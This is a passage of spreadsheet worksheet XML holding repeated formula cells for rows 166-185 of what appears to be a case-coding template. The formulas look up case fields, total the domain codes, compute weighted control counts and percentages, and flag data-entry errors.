        <f>IF(AI166="","",COUNTIF(N166:AG166,1))</f>
        <v/>
      </c>
      <c r="AL166" s="13">
        <f>IF(OR(AJ166="",AJ166=0),"",ROUND(100*(AJ166-AK166)/AJ166,1))</f>
        <v/>
      </c>
      <c r="AM166" s="11">
        <f>IF(AI166="","",IF(AI166=0,"No domain coded 1; ","")&amp;IF(M166="","Primary domain missing; ",IF(IFERROR(INDEX(E166:L166,1,M166),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N166:AG166)&lt;&gt;AJ166,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH166="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN166" s="13">
        <f>IF(AND(AI166&lt;&gt;"",AM166=""),1,0)</f>
        <v/>
      </c>
      <c r="AO166" s="14" t="n"/>
    </row>
    <row r="167">
      <c r="A167" s="11">
        <f>Cases!A167</f>
        <v/>
      </c>
      <c r="B167" s="11">
        <f>Cases!B167</f>
        <v/>
      </c>
      <c r="C167" s="11">
        <f>Cases!C167</f>
        <v/>
      </c>
      <c r="D167" s="11">
        <f>IF(Cases!F167="",LEFT(Cases!G167,120),Cases!F167)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E167:L167)=0,"",SUM(E167:L167))</f>
        <v/>
      </c>
      <c r="AJ167" s="13">
        <f>IF(AI167="","",N(E167)*3+N(F167)*2+N(G167)*2+N(H167)*2+N(I167)*2+N(J167)*3+N(K167)*3+N(L167)*3)</f>
        <v/>
      </c>
      <c r="AK167" s="13">
        <f>IF(AI167="","",COUNTIF(N167:AG167,1))</f>
        <v/>
      </c>
      <c r="AL167" s="13">
        <f>IF(OR(AJ167="",AJ167=0),"",ROUND(100*(AJ167-AK167)/AJ167,1))</f>
        <v/>
      </c>
      <c r="AM167" s="11">
        <f>IF(AI167="","",IF(AI167=0,"No domain coded 1; ","")&amp;IF(M167="","Primary domain missing; ",IF(IFERROR(INDEX(E167:L167,1,M167),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N167:AG167)&lt;&gt;AJ167,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH167="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN167" s="13">
        <f>IF(AND(AI167&lt;&gt;"",AM167=""),1,0)</f>
        <v/>
      </c>
      <c r="AO167" s="14" t="n"/>
    </row>
    <row r="168">
      <c r="A168" s="11">
        <f>Cases!A168</f>
        <v/>
      </c>
      <c r="B168" s="11">
        <f>Cases!B168</f>
        <v/>
      </c>
      <c r="C168" s="11">
        <f>Cases!C168</f>
        <v/>
      </c>
      <c r="D168" s="11">
        <f>IF(Cases!F168="",LEFT(Cases!G168,120),Cases!F168)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E168:L168)=0,"",SUM(E168:L168))</f>
        <v/>
      </c>
      <c r="AJ168" s="13">
        <f>IF(AI168="","",N(E168)*3+N(F168)*2+N(G168)*2+N(H168)*2+N(I168)*2+N(J168)*3+N(K168)*3+N(L168)*3)</f>
        <v/>
      </c>
      <c r="AK168" s="13">
        <f>IF(AI168="","",COUNTIF(N168:AG168,1))</f>
        <v/>
      </c>
      <c r="AL168" s="13">
        <f>IF(OR(AJ168="",AJ168=0),"",ROUND(100*(AJ168-AK168)/AJ168,1))</f>
        <v/>
      </c>
      <c r="AM168" s="11">
        <f>IF(AI168="","",IF(AI168=0,"No domain coded 1; ","")&amp;IF(M168="","Primary domain missing; ",IF(IFERROR(INDEX(E168:L168,1,M168),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N168:AG168)&lt;&gt;AJ168,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH168="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN168" s="13">
        <f>IF(AND(AI168&lt;&gt;"",AM168=""),1,0)</f>
        <v/>
      </c>
      <c r="AO168" s="14" t="n"/>
    </row>
    <row r="169">
      <c r="A169" s="11">
        <f>Cases!A169</f>
        <v/>
      </c>
      <c r="B169" s="11">
        <f>Cases!B169</f>
        <v/>
      </c>
      <c r="C169" s="11">
        <f>Cases!C169</f>
        <v/>
      </c>
      <c r="D169" s="11">
        <f>IF(Cases!F169="",LEFT(Cases!G169,120),Cases!F169)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E169:L169)=0,"",SUM(E169:L169))</f>
        <v/>
      </c>
      <c r="AJ169" s="13">
        <f>IF(AI169="","",N(E169)*3+N(F169)*2+N(G169)*2+N(H169)*2+N(I169)*2+N(J169)*3+N(K169)*3+N(L169)*3)</f>
        <v/>
      </c>
      <c r="AK169" s="13">
        <f>IF(AI169="","",COUNTIF(N169:AG169,1))</f>
        <v/>
      </c>
      <c r="AL169" s="13">
        <f>IF(OR(AJ169="",AJ169=0),"",ROUND(100*(AJ169-AK169)/AJ169,1))</f>
        <v/>
      </c>
      <c r="AM169" s="11">
        <f>IF(AI169="","",IF(AI169=0,"No domain coded 1; ","")&amp;IF(M169="","Primary domain missing; ",IF(IFERROR(INDEX(E169:L169,1,M169),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N169:AG169)&lt;&gt;AJ169,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH169="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN169" s="13">
        <f>IF(AND(AI169&lt;&gt;"",AM169=""),1,0)</f>
        <v/>
      </c>
      <c r="AO169" s="14" t="n"/>
    </row>
    <row r="170">
      <c r="A170" s="11">
        <f>Cases!A170</f>
        <v/>
      </c>
      <c r="B170" s="11">
        <f>Cases!B170</f>
        <v/>
      </c>
      <c r="C170" s="11">
        <f>Cases!C170</f>
        <v/>
      </c>
      <c r="D170" s="11">
        <f>IF(Cases!F170="",LEFT(Cases!G170,120),Cases!F170)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E170:L170)=0,"",SUM(E170:L170))</f>
        <v/>
      </c>
      <c r="AJ170" s="13">
        <f>IF(AI170="","",N(E170)*3+N(F170)*2+N(G170)*2+N(H170)*2+N(I170)*2+N(J170)*3+N(K170)*3+N(L170)*3)</f>
        <v/>
      </c>
      <c r="AK170" s="13">
        <f>IF(AI170="","",COUNTIF(N170:AG170,1))</f>
        <v/>
      </c>
      <c r="AL170" s="13">
        <f>IF(OR(AJ170="",AJ170=0),"",ROUND(100*(AJ170-AK170)/AJ170,1))</f>
        <v/>
      </c>
      <c r="AM170" s="11">
        <f>IF(AI170="","",IF(AI170=0,"No domain coded 1; ","")&amp;IF(M170="","Primary domain missing; ",IF(IFERROR(INDEX(E170:L170,1,M170),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N170:AG170)&lt;&gt;AJ170,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH170="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN170" s="13">
        <f>IF(AND(AI170&lt;&gt;"",AM170=""),1,0)</f>
        <v/>
      </c>
      <c r="AO170" s="14" t="n"/>
    </row>
    <row r="171">
      <c r="A171" s="11">
        <f>Cases!A171</f>
        <v/>
      </c>
      <c r="B171" s="11">
        <f>Cases!B171</f>
        <v/>
      </c>
      <c r="C171" s="11">
        <f>Cases!C171</f>
        <v/>
      </c>
      <c r="D171" s="11">
        <f>IF(Cases!F171="",LEFT(Cases!G171,120),Cases!F171)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E171:L171)=0,"",SUM(E171:L171))</f>
        <v/>
      </c>
      <c r="AJ171" s="13">
        <f>IF(AI171="","",N(E171)*3+N(F171)*2+N(G171)*2+N(H171)*2+N(I171)*2+N(J171)*3+N(K171)*3+N(L171)*3)</f>
        <v/>
      </c>
      <c r="AK171" s="13">
        <f>IF(AI171="","",COUNTIF(N171:AG171,1))</f>
        <v/>
      </c>
      <c r="AL171" s="13">
        <f>IF(OR(AJ171="",AJ171=0),"",ROUND(100*(AJ171-AK171)/AJ171,1))</f>
        <v/>
      </c>
      <c r="AM171" s="11">
        <f>IF(AI171="","",IF(AI171=0,"No domain coded 1; ","")&amp;IF(M171="","Primary domain missing; ",IF(IFERROR(INDEX(E171:L171,1,M171),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N171:AG171)&lt;&gt;AJ171,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH171="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN171" s="13">
        <f>IF(AND(AI171&lt;&gt;"",AM171=""),1,0)</f>
        <v/>
      </c>
      <c r="AO171" s="14" t="n"/>
    </row>
    <row r="172">
      <c r="A172" s="11">
        <f>Cases!A172</f>
        <v/>
      </c>
      <c r="B172" s="11">
        <f>Cases!B172</f>
        <v/>
      </c>
      <c r="C172" s="11">
        <f>Cases!C172</f>
        <v/>
      </c>
      <c r="D172" s="11">
        <f>IF(Cases!F172="",LEFT(Cases!G172,120),Cases!F172)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E172:L172)=0,"",SUM(E172:L172))</f>
        <v/>
      </c>
      <c r="AJ172" s="13">
        <f>IF(AI172="","",N(E172)*3+N(F172)*2+N(G172)*2+N(H172)*2+N(I172)*2+N(J172)*3+N(K172)*3+N(L172)*3)</f>
        <v/>
      </c>
      <c r="AK172" s="13">
        <f>IF(AI172="","",COUNTIF(N172:AG172,1))</f>
        <v/>
      </c>
      <c r="AL172" s="13">
        <f>IF(OR(AJ172="",AJ172=0),"",ROUND(100*(AJ172-AK172)/AJ172,1))</f>
        <v/>
      </c>
      <c r="AM172" s="11">
        <f>IF(AI172="","",IF(AI172=0,"No domain coded 1; ","")&amp;IF(M172="","Primary domain missing; ",IF(IFERROR(INDEX(E172:L172,1,M172),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N172:AG172)&lt;&gt;AJ172,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH172="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN172" s="13">
        <f>IF(AND(AI172&lt;&gt;"",AM172=""),1,0)</f>
        <v/>
      </c>
      <c r="AO172" s="14" t="n"/>
    </row>
    <row r="173">
      <c r="A173" s="11">
        <f>Cases!A173</f>
        <v/>
      </c>
      <c r="B173" s="11">
        <f>Cases!B173</f>
        <v/>
      </c>
      <c r="C173" s="11">
        <f>Cases!C173</f>
        <v/>
      </c>
      <c r="D173" s="11">
        <f>IF(Cases!F173="",LEFT(Cases!G173,120),Cases!F173)</f>
        <v/>
      </c>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c r="AI173" s="13">
        <f>IF(COUNT(E173:L173)=0,"",SUM(E173:L173))</f>
        <v/>
      </c>
      <c r="AJ173" s="13">
        <f>IF(AI173="","",N(E173)*3+N(F173)*2+N(G173)*2+N(H173)*2+N(I173)*2+N(J173)*3+N(K173)*3+N(L173)*3)</f>
        <v/>
      </c>
      <c r="AK173" s="13">
        <f>IF(AI173="","",COUNTIF(N173:AG173,1))</f>
        <v/>
      </c>
      <c r="AL173" s="13">
        <f>IF(OR(AJ173="",AJ173=0),"",ROUND(100*(AJ173-AK173)/AJ173,1))</f>
        <v/>
      </c>
      <c r="AM173" s="11">
        <f>IF(AI173="","",IF(AI173=0,"No domain coded 1; ","")&amp;IF(M173="","Primary domain missing; ",IF(IFERROR(INDEX(E173:L173,1,M173),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N173:AG173)&lt;&gt;AJ173,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH173="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN173" s="13">
        <f>IF(AND(AI173&lt;&gt;"",AM173=""),1,0)</f>
        <v/>
      </c>
      <c r="AO173" s="14" t="n"/>
    </row>
    <row r="174">
      <c r="A174" s="11">
        <f>Cases!A174</f>
        <v/>
      </c>
      <c r="B174" s="11">
        <f>Cases!B174</f>
        <v/>
      </c>
      <c r="C174" s="11">
        <f>Cases!C174</f>
        <v/>
      </c>
      <c r="D174" s="11">
        <f>IF(Cases!F174="",LEFT(Cases!G174,120),Cases!F174)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E174:L174)=0,"",SUM(E174:L174))</f>
        <v/>
      </c>
      <c r="AJ174" s="13">
        <f>IF(AI174="","",N(E174)*3+N(F174)*2+N(G174)*2+N(H174)*2+N(I174)*2+N(J174)*3+N(K174)*3+N(L174)*3)</f>
        <v/>
      </c>
      <c r="AK174" s="13">
        <f>IF(AI174="","",COUNTIF(N174:AG174,1))</f>
        <v/>
      </c>
      <c r="AL174" s="13">
        <f>IF(OR(AJ174="",AJ174=0),"",ROUND(100*(AJ174-AK174)/AJ174,1))</f>
        <v/>
      </c>
      <c r="AM174" s="11">
        <f>IF(AI174="","",IF(AI174=0,"No domain coded 1; ","")&amp;IF(M174="","Primary domain missing; ",IF(IFERROR(INDEX(E174:L174,1,M174),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N174:AG174)&lt;&gt;AJ174,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH174="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN174" s="13">
        <f>IF(AND(AI174&lt;&gt;"",AM174=""),1,0)</f>
        <v/>
      </c>
      <c r="AO174" s="14" t="n"/>
    </row>
    <row r="175">
      <c r="A175" s="11">
        <f>Cases!A175</f>
        <v/>
      </c>
      <c r="B175" s="11">
        <f>Cases!B175</f>
        <v/>
      </c>
      <c r="C175" s="11">
        <f>Cases!C175</f>
        <v/>
      </c>
      <c r="D175" s="11">
        <f>IF(Cases!F175="",LEFT(Cases!G175,120),Cases!F175)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E175:L175)=0,"",SUM(E175:L175))</f>
        <v/>
      </c>
      <c r="AJ175" s="13">
        <f>IF(AI175="","",N(E175)*3+N(F175)*2+N(G175)*2+N(H175)*2+N(I175)*2+N(J175)*3+N(K175)*3+N(L175)*3)</f>
        <v/>
      </c>
      <c r="AK175" s="13">
        <f>IF(AI175="","",COUNTIF(N175:AG175,1))</f>
        <v/>
      </c>
      <c r="AL175" s="13">
        <f>IF(OR(AJ175="",AJ175=0),"",ROUND(100*(AJ175-AK175)/AJ175,1))</f>
        <v/>
      </c>
      <c r="AM175" s="11">
        <f>IF(AI175="","",IF(AI175=0,"No domain coded 1; ","")&amp;IF(M175="","Primary domain missing; ",IF(IFERROR(INDEX(E175:L175,1,M175),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N175:AG175)&lt;&gt;AJ175,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH175="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN175" s="13">
        <f>IF(AND(AI175&lt;&gt;"",AM175=""),1,0)</f>
        <v/>
      </c>
      <c r="AO175" s="14" t="n"/>
    </row>
    <row r="176">
      <c r="A176" s="11">
        <f>Cases!A176</f>
        <v/>
      </c>
      <c r="B176" s="11">
        <f>Cases!B176</f>
        <v/>
      </c>
      <c r="C176" s="11">
        <f>Cases!C176</f>
        <v/>
      </c>
      <c r="D176" s="11">
        <f>IF(Cases!F176="",LEFT(Cases!G176,120),Cases!F176)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E176:L176)=0,"",SUM(E176:L176))</f>
        <v/>
      </c>
      <c r="AJ176" s="13">
        <f>IF(AI176="","",N(E176)*3+N(F176)*2+N(G176)*2+N(H176)*2+N(I176)*2+N(J176)*3+N(K176)*3+N(L176)*3)</f>
        <v/>
      </c>
      <c r="AK176" s="13">
        <f>IF(AI176="","",COUNTIF(N176:AG176,1))</f>
        <v/>
      </c>
      <c r="AL176" s="13">
        <f>IF(OR(AJ176="",AJ176=0),"",ROUND(100*(AJ176-AK176)/AJ176,1))</f>
        <v/>
      </c>
      <c r="AM176" s="11">
        <f>IF(AI176="","",IF(AI176=0,"No domain coded 1; ","")&amp;IF(M176="","Primary domain missing; ",IF(IFERROR(INDEX(E176:L176,1,M176),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N176:AG176)&lt;&gt;AJ176,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH176="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN176" s="13">
        <f>IF(AND(AI176&lt;&gt;"",AM176=""),1,0)</f>
        <v/>
      </c>
      <c r="AO176" s="14" t="n"/>
    </row>
    <row r="177">
      <c r="A177" s="11">
        <f>Cases!A177</f>
        <v/>
      </c>
      <c r="B177" s="11">
        <f>Cases!B177</f>
        <v/>
      </c>
      <c r="C177" s="11">
        <f>Cases!C177</f>
        <v/>
      </c>
      <c r="D177" s="11">
        <f>IF(Cases!F177="",LEFT(Cases!G177,120),Cases!F177)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E177:L177)=0,"",SUM(E177:L177))</f>
        <v/>
      </c>
      <c r="AJ177" s="13">
        <f>IF(AI177="","",N(E177)*3+N(F177)*2+N(G177)*2+N(H177)*2+N(I177)*2+N(J177)*3+N(K177)*3+N(L177)*3)</f>
        <v/>
      </c>
      <c r="AK177" s="13">
        <f>IF(AI177="","",COUNTIF(N177:AG177,1))</f>
        <v/>
      </c>
      <c r="AL177" s="13">
        <f>IF(OR(AJ177="",AJ177=0),"",ROUND(100*(AJ177-AK177)/AJ177,1))</f>
        <v/>
      </c>
      <c r="AM177" s="11">
        <f>IF(AI177="","",IF(AI177=0,"No domain coded 1; ","")&amp;IF(M177="","Primary domain missing; ",IF(IFERROR(INDEX(E177:L177,1,M177),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N177:AG177)&lt;&gt;AJ177,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH177="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN177" s="13">
        <f>IF(AND(AI177&lt;&gt;"",AM177=""),1,0)</f>
        <v/>
      </c>
      <c r="AO177" s="14" t="n"/>
    </row>
    <row r="178">
      <c r="A178" s="11">
        <f>Cases!A178</f>
        <v/>
      </c>
      <c r="B178" s="11">
        <f>Cases!B178</f>
        <v/>
      </c>
      <c r="C178" s="11">
        <f>Cases!C178</f>
        <v/>
      </c>
      <c r="D178" s="11">
        <f>IF(Cases!F178="",LEFT(Cases!G178,120),Cases!F178)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E178:L178)=0,"",SUM(E178:L178))</f>
        <v/>
      </c>
      <c r="AJ178" s="13">
        <f>IF(AI178="","",N(E178)*3+N(F178)*2+N(G178)*2+N(H178)*2+N(I178)*2+N(J178)*3+N(K178)*3+N(L178)*3)</f>
        <v/>
      </c>
      <c r="AK178" s="13">
        <f>IF(AI178="","",COUNTIF(N178:AG178,1))</f>
        <v/>
      </c>
      <c r="AL178" s="13">
        <f>IF(OR(AJ178="",AJ178=0),"",ROUND(100*(AJ178-AK178)/AJ178,1))</f>
        <v/>
      </c>
      <c r="AM178" s="11">
        <f>IF(AI178="","",IF(AI178=0,"No domain coded 1; ","")&amp;IF(M178="","Primary domain missing; ",IF(IFERROR(INDEX(E178:L178,1,M178),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N178:AG178)&lt;&gt;AJ178,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH178="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN178" s="13">
        <f>IF(AND(AI178&lt;&gt;"",AM178=""),1,0)</f>
        <v/>
      </c>
      <c r="AO178" s="14" t="n"/>
    </row>
    <row r="179">
      <c r="A179" s="11">
        <f>Cases!A179</f>
        <v/>
      </c>
      <c r="B179" s="11">
        <f>Cases!B179</f>
        <v/>
      </c>
      <c r="C179" s="11">
        <f>Cases!C179</f>
        <v/>
      </c>
      <c r="D179" s="11">
        <f>IF(Cases!F179="",LEFT(Cases!G179,120),Cases!F179)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E179:L179)=0,"",SUM(E179:L179))</f>
        <v/>
      </c>
      <c r="AJ179" s="13">
        <f>IF(AI179="","",N(E179)*3+N(F179)*2+N(G179)*2+N(H179)*2+N(I179)*2+N(J179)*3+N(K179)*3+N(L179)*3)</f>
        <v/>
      </c>
      <c r="AK179" s="13">
        <f>IF(AI179="","",COUNTIF(N179:AG179,1))</f>
        <v/>
      </c>
      <c r="AL179" s="13">
        <f>IF(OR(AJ179="",AJ179=0),"",ROUND(100*(AJ179-AK179)/AJ179,1))</f>
        <v/>
      </c>
      <c r="AM179" s="11">
        <f>IF(AI179="","",IF(AI179=0,"No domain coded 1; ","")&amp;IF(M179="","Primary domain missing; ",IF(IFERROR(INDEX(E179:L179,1,M179),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N179:AG179)&lt;&gt;AJ179,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH179="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN179" s="13">
        <f>IF(AND(AI179&lt;&gt;"",AM179=""),1,0)</f>
        <v/>
      </c>
      <c r="AO179" s="14" t="n"/>
    </row>
    <row r="180">
      <c r="A180" s="11">
        <f>Cases!A180</f>
        <v/>
      </c>
      <c r="B180" s="11">
        <f>Cases!B180</f>
        <v/>
      </c>
      <c r="C180" s="11">
        <f>Cases!C180</f>
        <v/>
      </c>
      <c r="D180" s="11">
        <f>IF(Cases!F180="",LEFT(Cases!G180,120),Cases!F180)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E180:L180)=0,"",SUM(E180:L180))</f>
        <v/>
      </c>
      <c r="AJ180" s="13">
        <f>IF(AI180="","",N(E180)*3+N(F180)*2+N(G180)*2+N(H180)*2+N(I180)*2+N(J180)*3+N(K180)*3+N(L180)*3)</f>
        <v/>
      </c>
      <c r="AK180" s="13">
        <f>IF(AI180="","",COUNTIF(N180:AG180,1))</f>
        <v/>
      </c>
      <c r="AL180" s="13">
        <f>IF(OR(AJ180="",AJ180=0),"",ROUND(100*(AJ180-AK180)/AJ180,1))</f>
        <v/>
      </c>
      <c r="AM180" s="11">
        <f>IF(AI180="","",IF(AI180=0,"No domain coded 1; ","")&amp;IF(M180="","Primary domain missing; ",IF(IFERROR(INDEX(E180:L180,1,M180),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N180:AG180)&lt;&gt;AJ180,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH180="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN180" s="13">
        <f>IF(AND(AI180&lt;&gt;"",AM180=""),1,0)</f>
        <v/>
      </c>
      <c r="AO180" s="14" t="n"/>
    </row>
    <row r="181">
      <c r="A181" s="11">
        <f>Cases!A181</f>
        <v/>
      </c>
      <c r="B181" s="11">
        <f>Cases!B181</f>
        <v/>
      </c>
      <c r="C181" s="11">
        <f>Cases!C181</f>
        <v/>
      </c>
      <c r="D181" s="11">
        <f>IF(Cases!F181="",LEFT(Cases!G181,120),Cases!F181)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E181:L181)=0,"",SUM(E181:L181))</f>
        <v/>
      </c>
      <c r="AJ181" s="13">
        <f>IF(AI181="","",N(E181)*3+N(F181)*2+N(G181)*2+N(H181)*2+N(I181)*2+N(J181)*3+N(K181)*3+N(L181)*3)</f>
        <v/>
      </c>
      <c r="AK181" s="13">
        <f>IF(AI181="","",COUNTIF(N181:AG181,1))</f>
        <v/>
      </c>
      <c r="AL181" s="13">
        <f>IF(OR(AJ181="",AJ181=0),"",ROUND(100*(AJ181-AK181)/AJ181,1))</f>
        <v/>
      </c>
      <c r="AM181" s="11">
        <f>IF(AI181="","",IF(AI181=0,"No domain coded 1; ","")&amp;IF(M181="","Primary domain missing; ",IF(IFERROR(INDEX(E181:L181,1,M181),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N181:AG181)&lt;&gt;AJ181,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH181="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN181" s="13">
        <f>IF(AND(AI181&lt;&gt;"",AM181=""),1,0)</f>
        <v/>
      </c>
      <c r="AO181" s="14" t="n"/>
    </row>
    <row r="182">
      <c r="A182" s="11">
        <f>Cases!A182</f>
        <v/>
      </c>
      <c r="B182" s="11">
        <f>Cases!B182</f>
        <v/>
      </c>
      <c r="C182" s="11">
        <f>Cases!C182</f>
        <v/>
      </c>
      <c r="D182" s="11">
        <f>IF(Cases!F182="",LEFT(Cases!G182,120),Cases!F182)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E182:L182)=0,"",SUM(E182:L182))</f>
        <v/>
      </c>
      <c r="AJ182" s="13">
        <f>IF(AI182="","",N(E182)*3+N(F182)*2+N(G182)*2+N(H182)*2+N(I182)*2+N(J182)*3+N(K182)*3+N(L182)*3)</f>
        <v/>
      </c>
      <c r="AK182" s="13">
        <f>IF(AI182="","",COUNTIF(N182:AG182,1))</f>
        <v/>
      </c>
      <c r="AL182" s="13">
        <f>IF(OR(AJ182="",AJ182=0),"",ROUND(100*(AJ182-AK182)/AJ182,1))</f>
        <v/>
      </c>
      <c r="AM182" s="11">
        <f>IF(AI182="","",IF(AI182=0,"No domain coded 1; ","")&amp;IF(M182="","Primary domain missing; ",IF(IFERROR(INDEX(E182:L182,1,M182),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N182:AG182)&lt;&gt;AJ182,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH182="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN182" s="13">
        <f>IF(AND(AI182&lt;&gt;"",AM182=""),1,0)</f>
        <v/>
      </c>
      <c r="AO182" s="14" t="n"/>
    </row>
    <row r="183">
      <c r="A183" s="11">
        <f>Cases!A183</f>
        <v/>
      </c>
      <c r="B183" s="11">
        <f>Cases!B183</f>
        <v/>
      </c>
      <c r="C183" s="11">
        <f>Cases!C183</f>
        <v/>
      </c>
      <c r="D183" s="11">
        <f>IF(Cases!F183="",LEFT(Cases!G183,120),Cases!F183)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E183:L183)=0,"",SUM(E183:L183))</f>
        <v/>
      </c>
      <c r="AJ183" s="13">
        <f>IF(AI183="","",N(E183)*3+N(F183)*2+N(G183)*2+N(H183)*2+N(I183)*2+N(J183)*3+N(K183)*3+N(L183)*3)</f>
        <v/>
      </c>
      <c r="AK183" s="13">
        <f>IF(AI183="","",COUNTIF(N183:AG183,1))</f>
        <v/>
      </c>
      <c r="AL183" s="13">
        <f>IF(OR(AJ183="",AJ183=0),"",ROUND(100*(AJ183-AK183)/AJ183,1))</f>
        <v/>
      </c>
      <c r="AM183" s="11">
        <f>IF(AI183="","",IF(AI183=0,"No domain coded 1; ","")&amp;IF(M183="","Primary domain missing; ",IF(IFERROR(INDEX(E183:L183,1,M183),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N183:AG183)&lt;&gt;AJ183,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH183="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN183" s="13">
        <f>IF(AND(AI183&lt;&gt;"",AM183=""),1,0)</f>
        <v/>
      </c>
      <c r="AO183" s="14" t="n"/>
    </row>
    <row r="184">
      <c r="A184" s="11">
        <f>Cases!A184</f>
        <v/>
      </c>
      <c r="B184" s="11">
        <f>Cases!B184</f>
        <v/>
      </c>
      <c r="C184" s="11">
        <f>Cases!C184</f>
        <v/>
      </c>
      <c r="D184" s="11">
        <f>IF(Cases!F184="",LEFT(Cases!G184,120),Cases!F184)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E184:L184)=0,"",SUM(E184:L184))</f>
        <v/>
      </c>
      <c r="AJ184" s="13">
        <f>IF(AI184="","",N(E184)*3+N(F184)*2+N(G184)*2+N(H184)*2+N(I184)*2+N(J184)*3+N(K184)*3+N(L184)*3)</f>
        <v/>
      </c>
      <c r="AK184" s="13">
        <f>IF(AI184="","",COUNTIF(N184:AG184,1))</f>
        <v/>
      </c>
      <c r="AL184" s="13">
        <f>IF(OR(AJ184="",AJ184=0),"",ROUND(100*(AJ184-AK184)/AJ184,1))</f>
        <v/>
      </c>
      <c r="AM184" s="11">
        <f>IF(AI184="","",IF(AI184=0,"No domain coded 1; ","")&amp;IF(M184="","Primary domain missing; ",IF(IFERROR(INDEX(E184:L184,1,M184),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N184:AG184)&lt;&gt;AJ184,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH184="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN184" s="13">
        <f>IF(AND(AI184&lt;&gt;"",AM184=""),1,0)</f>
        <v/>
      </c>
      <c r="AO184" s="14" t="n"/>
    </row>
    <row r="185">
      <c r="A185" s="11">
        <f>Cases!A185</f>
        <v/>
      </c>
      <c r="B185" s="11">
        <f>Cases!B185</f>
        <v/>
      </c>
      <c r="C185" s="11">
        <f>Cases!C185</f>
        <v/>
      </c>
      <c r="D185" s="11">
        <f>IF(Cases!F185="",LEFT(Cases!G185,120),Cases!F185)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E185:L185)=0,"",SUM(E185:L185))</f>
        <v/>
      </c>
